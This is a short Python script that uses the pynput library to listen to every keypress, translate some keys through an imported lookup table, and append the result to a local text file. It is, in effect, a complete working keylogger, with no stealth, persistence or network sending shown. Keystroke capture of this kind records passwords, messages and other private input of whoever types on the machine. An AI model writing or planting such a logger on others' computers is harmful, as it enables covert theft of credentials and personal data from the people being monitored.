from pynput.keyboard import Listener
from dictionary import dumy_data

def writefile(key):
    letter = str(key)
    letter = letter.replace("'", "")

    for item, value in dumy_data.key_Strokes.items():
        if letter == item:
            letter = value

    with open('file.txt', 'a') as file:
        file.write(letter)

def pykey():
    with Listener(on_press=writefile) as l:
        l.join()

pykey()